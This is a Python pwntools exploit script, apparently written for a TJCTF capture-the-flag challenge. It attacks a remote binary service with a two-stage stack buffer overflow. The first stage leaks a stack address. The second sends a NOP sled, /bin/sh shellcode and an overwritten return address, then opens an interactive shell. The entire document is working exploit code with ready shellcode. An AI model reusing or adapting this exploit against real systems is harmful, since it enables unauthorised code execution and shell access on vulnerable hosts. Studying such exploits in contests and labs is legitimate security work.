from pwn import *


def tohex(val, nbits): 
	return hex((val + (1 << nbits)) % (1 << nbits))

def main():

	local = 0

	if local:
		p = process('./osrs_bin')
	else:
		p = remote('p1.tjctf.org', 8006)


	# Step1: get stack address and return to main

	print(p.recvuntil("Enter a tree type: "))

	pad = 272 * "A"
	get_tree= p32(0x08048546)

	payload1 = pad + get_tree

	p.sendline(payload1)
	print(p.recvline())
	out = p.recvline().split(' ')
	sp = int(tohex(int(out[5],10),32),16)

	#Step2: payload

	#shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
	#shellcode for 32 bits
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\xb0\x0b\xcd\x80" 
	#shellcode for 64 bits 24 bytes
	#shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\xb0\x3b\x0f\x05"

	#shellcode ="A"*20 + "B"*8
	padding = "\x90" * (260 - len(shellcode))

	eip = p32(sp)

	payload = ""
	payload += padding
	payload += shellcode
	payload += "\x90" * 12
	payload += eip

	print payload + "\n"
	p.recvuntil("Enter a tree type: ")
	p.sendline(payload)
	print(p.recvline())

	p.interactive()

	p.close()

if __name__ == '__main__':
	main()


